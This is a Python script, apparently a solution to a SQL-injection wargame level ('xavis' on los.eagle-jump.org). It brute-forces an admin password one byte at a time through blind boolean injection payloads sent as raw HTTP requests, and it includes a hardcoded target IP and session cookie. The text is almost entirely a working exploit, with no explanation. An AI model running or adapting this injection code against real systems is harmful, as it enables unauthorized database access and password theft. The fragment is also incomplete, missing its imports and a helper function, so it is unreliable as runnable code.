array = ""
for x in range(0, 40):
    for y in range(0, 256):
        send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        if x % 4 == 0:
            data = "GET /xavis_fd4389515d6540477114ec3c79623afe.php?pw=%27+or+1+and+id%3d%27admin%27+and+(ord(substr(pw,+" + str(1 + (x // 4)) + ",+1))+>>+24)%3d" + str(y) + "%23 HTTP/1.1\r\n" + \
                   "Host: los.eagle-jump.org\r\n" + \
                   "Cookie: __cfduid=d6c69d458d20667fbefb8b1de9609ec761490019725; PHPSESSID=bq239tdcrn9f21ihmohqn1qma7\r\n" + \
                   "\r\n"

        elif x % 4 == 1:
            data = "GET /xavis_fd4389515d6540477114ec3c79623afe.php?pw=%27+or+1+and+id%3d%27admin%27+and+((ord(substr(pw,+" + str(1 + (x // 4)) + ",+1))+-+((ord(substr(pw,+" + str(1 + (x // 4)) + ",+1))+>>+24)+<<+24))+>>+16)%3d" + str(y) + "%23 HTTP/1.1\r\n" + \
               "Host: los.eagle-jump.org\r\n" + \
               "Cookie: __cfduid=d6c69d458d20667fbefb8b1de9609ec761490019725; PHPSESSID=bq239tdcrn9f21ihmohqn1qma7\r\n" + \
               "\r\n"

        elif x % 4 == 2:
            data = "GET /xavis_fd4389515d6540477114ec3c79623afe.php?pw=%27+or+1+and+id%3d%27admin%27+and+((ord(substr(pw,+" + str(1 + (x // 4)) + ",+1))+-+((ord(substr(pw,+" + str(1 + (x // 4)) + ", 1))+>>+16)+<<+16))+>>+8)%3d" + str(y) + "%23 HTTP/1.1\r\n" + \
               "Host: los.eagle-jump.org\r\n" + \
               "Cookie: __cfduid=d6c69d458d20667fbefb8b1de9609ec761490019725; PHPSESSID=bq239tdcrn9f21ihmohqn1qma7\r\n" + \
               "\r\n"

        elif x % 4 == 3:
            data = "GET /xavis_fd4389515d6540477114ec3c79623afe.php?pw=%27+or+1+and+id%3d%27admin%27+and+(ord(substr(pw,+" + str(1 + (x // 4)) + ",+1))+-+((ord(substr(pw,+" + str(1 + (x // 4)) + ",+1))+>>+8)+<<+8))%3d" + str(y) + "%23 HTTP/1.1\r\n" + \
               "Host: los.eagle-jump.org\r\n" + \
               "Cookie: __cfduid=d6c69d458d20667fbefb8b1de9609ec761490019725; PHPSESSID=bq239tdcrn9f21ihmohqn1qma7\r\n" + \
               "\r\n"

        else:
            pass

        send.connect(("104.27.174.42", 80))
        send.send(data.encode())
        recv = send.recv(3000)
        if y % 16 == 0:
            print("x: " + str(x) + ", y: " + str(y))
            
            
        if "Hello admin" in recv.decode():
            array += dec2hex_str(y)
            print("array: " + array + "********************************************************")
            break
